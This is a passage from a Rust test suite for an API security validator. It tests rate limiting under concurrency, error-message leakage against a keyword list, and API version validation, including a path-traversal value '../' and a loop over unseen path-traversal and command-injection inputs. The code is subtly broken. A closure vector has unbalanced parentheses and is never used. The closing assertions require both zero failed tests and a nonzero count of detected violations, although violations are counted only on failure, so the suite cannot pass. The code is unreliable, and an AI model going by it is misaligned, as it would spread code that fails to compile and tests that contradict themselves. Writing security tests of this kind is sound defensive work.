        for input in &malicious_inputs[0..6] { // Test path traversal and command injection
            let mut test_input = HashMap::new();
            test_input.insert("filename".to_string(), input.to_string());

            let result = validator.validate(&test_input);
            
            if result.is_ok() {
                eprintln!("Malicious filename should be rejected by pattern validation: '{}'", input);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_concurrent_security_validation(&mut self) {
        let test_name = "concurrent_security_validation";
        let start = Instant::now();
        let mut all_passed = true;

        use std::sync::{Arc, Mutex};
        use std::thread;

        let policy = SecurityPolicy {
            rate_limit_per_minute: 10,
            ..SecurityPolicy::default()
        };

        let security_validator = Arc::new(Mutex::new(SecurityValidator::new(policy)));
        let mut handles = vec![];

        // Spawn concurrent validation requests
        for i in 0..20 {
            let validator_clone = Arc::clone(&security_validator);
            
            let handle = thread::spawn(move || {
                let mut validator = validator_clone.lock().unwrap();
                
                validator.validate_request(
                    &format!("concurrent_client_{}", i % 5), // 5 different clients
                    Some("https://localhost"),
                    Some("application/json"),
                    100,
                    Some("valid_token_123")
                )
            });
            
            handles.push(handle);
        }

        // Collect results
        let mut successful_requests = 0;
        let mut rate_limited_requests = 0;
        let mut other_errors = 0;

        for handle in handles {
            match handle.join() {
                Ok(Ok(())) => {
                    successful_requests += 1;
                },
                Ok(Err(NetworkError::HTTPError { status: Some(429), .. })) => {
                    rate_limited_requests += 1;
                },
                Ok(Err(e)) => {
                    eprintln!("Unexpected error in concurrent validation: {:?}", e);
                    other_errors += 1;
                    all_passed = false;
                },
                Err(_) => {
                    eprintln!("Thread panicked during concurrent validation");
                    all_passed = false;
                }
            }
        }

        println!("Concurrent validation results: {} successful, {} rate-limited, {} errors", 
                successful_requests, rate_limited_requests, other_errors);

        // With 5 clients each making 4 requests and a rate limit of 10/minute per client,
        // some requests should succeed and some should be rate limited
        if successful_requests == 0 {
            eprintln!("Some concurrent requests should succeed");
            all_passed = false;
        }

        if other_errors > 0 {
            eprintln!("Should not have errors other than rate limiting");
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_error_information_leakage(&mut self) {
        let test_name = "error_information_leakage";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let mut security_validator = SecurityValidator::new(policy);

        // Test that error messages don't leak sensitive information
        let test_cases = vec![
            // Rate limiting
            (|| security_validator.validate_request(
                "leak_test_client",
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some("valid_token_123"))), // First call to set up rate limiting
            ),
            (|| security_validator.validate_request(
                "leak_test_client",
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some("valid_token_123")), // Second call within rate limit
            ),
        ];

        // Trigger rate limiting
        for _ in 0..=10 {  // Exceed rate limit
            let _ = security_validator.validate_request(
                "leak_test_client",
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some("valid_token_123")
            );
        }

        // Now test that error doesn't leak information
        let result = security_validator.validate_request(
            "leak_test_client",
            Some("https://localhost"),
            Some("application/json"),
            100,
            Some("valid_token_123")
        );

        match result {
            Err(NetworkError::HTTPError { reason, .. }) => {
                // Check that error message doesn't contain sensitive info
                let sensitive_keywords = vec![
                    "password", "token", "secret", "key", "internal", "database",
                    "server", "system", "config", "admin", "root"
                ];
                
                let reason_lower = reason.to_lowercase();
                for keyword in sensitive_keywords {
                    if reason_lower.contains(keyword) {
                        eprintln!("Error message may leak sensitive information: contains '{}'", keyword);
                        all_passed = false;
                    }
                }

                // Error should be generic but informative
                if !reason_lower.contains("rate limit") {
                    eprintln!("Rate limit error should mention rate limiting");
                    all_passed = false;
                }
            },
            _ => {
                eprintln!("Should get rate limit error");
                all_passed = false;
            }
        }

        // Test authentication error doesn't leak info
        let result = security_validator.validate_request(
            "auth_test_client",
            Some("https://localhost"),
            Some("application/json"),
            100,
            Some("invalid_token") // Invalid token
        );

        match result {
            Err(NetworkError::HTTPError { status: Some(401), reason }) => {
                // Should be generic authentication error
                if reason.contains("database") || 
                   reason.contains("user not found") ||
                   reason.contains("specific details about why auth failed") {
                    eprintln!("Authentication error should not leak implementation details");
                    all_passed = false;
                }
            },
            _ => {
                eprintln!("Should get 401 authentication error");
                all_passed = false;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_api_versioning_security(&mut self) {
        let test_name = "api_versioning_security";
        let start = Instant::now();
        let mut all_passed = true;

        // Test API version validation
        let supported_versions = vec!["v1", "v2", "v3"];
        let deprecated_versions = vec!["v0", "beta"];
        let invalid_versions = vec!["../", "admin", "v999", ""];

        let validate_api_version = |version: &str| -> Result<(), NetworkError> {
            if supported_versions.contains(&version) {
                Ok(())
            } else if deprecated_versions.contains(&version) {
                Err(NetworkError::HTTPError {
                    url: format!("api/{}/endpoint", version),
                    status: Some(410), // Gone
                    reason: format!("API version {} is deprecated", version),
                })
            } else {
                Err(NetworkError::HTTPError {
                    url: format!("api/{}/endpoint", version),
                    status: Some(400), // Bad Request
                    reason: "Invalid API version".to_string(),
                })
            }
        };

        // Test supported versions
        for version in supported_versions {
            let result = validate_api_version(version);
            if result.is_err() {
                eprintln!("Supported API version '{}' should be accepted: {:?}", version, result.err());
                all_passed = false;
            }
        }

        // Test deprecated versions
        for version in deprecated_versions {
            let result = validate_api_version(version);
            match result {
                Err(NetworkError::HTTPError { status: Some(410), .. }) => {
                    // Expected deprecated API response
                },
                _ => {
                    eprintln!("Deprecated API version '{}' should return 410 Gone", version);
                    all_passed = false;
                }
            }
        }

        // Test invalid versions (potential security risk)
        for version in invalid_versions {
            let result = validate_api_version(version);
            match result {
                Err(NetworkError::HTTPError { status: Some(400), .. }) => {
                    // Expected invalid version response
                },
                _ => {
                    eprintln!("Invalid API version '{}' should return 400 Bad Request", version);
                    all_passed = false;
                    self.security_violations_detected += 1;
                }
            }
        }

        // Test version-specific security policies
        let get_version_policy = |version: &str| -> SecurityPolicy {
            match version {
                "v1" => SecurityPolicy {
                    rate_limit_per_minute: 30, // Lower rate limit for older version
                    ..SecurityPolicy::default()
                },
                "v2" => SecurityPolicy {
                    rate_limit_per_minute: 60,
                    ..SecurityPolicy::default()
                },
                "v3" => SecurityPolicy {
                    rate_limit_per_minute: 100, // Higher rate limit for latest version
                    ..SecurityPolicy::default()
                },
                _ => SecurityPolicy::default(),
            }
        };

        // Verify different versions have appropriate policies
        let v1_policy = get_version_policy("v1");
        let v3_policy = get_version_policy("v3");

        if v1_policy.rate_limit_per_minute >= v3_policy.rate_limit_per_minute {
            eprintln!("Older API versions should have stricter rate limits");
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    fn record_test_result(&mut self, test_name: &str, duration: Duration, passed: bool) {
        self.test_count += 1;
        
        if passed {
            self.passed_tests += 1;
            println!("✓ {} completed in {:.2}ms", test_name, duration.as_millis());
        } else {
            self.failed_tests += 1;
            println!("✗ {} failed after {:.2}ms", test_name, duration.as_millis());
        }
    }

    fn print_results(&self) {
        println!("\n=== API Validation and Security Test Results ===");
        println!("Total Tests: {}", self.test_count);
        println!("Passed: {}", self.passed_tests);
        println!("Failed: {}", self.failed_tests);
        println!("Success Rate: {:.1}%", (self.passed_tests as f64 / self.test_count as f64) * 100.0);
        println!("Security Violations Detected: {}", self.security_violations_detected);
        println!("Input Validation Failures: {}", self.input_validation_failures);
    }
}

#[tokio::test]
async fn run_api_validation_tests() {
    let mut test_suite = APIValidationTestSuite::new();
    test_suite.run_all_tests().await;
    
    // Ensure all tests passed
    assert!(test_suite.failed_tests == 0, "All API validation tests should pass");
    assert!(test_suite.passed_tests > 15, "Should have comprehensive test coverage");
    assert!(test_suite.security_violations_detected > 0, "Should have detected security violations in tests");
}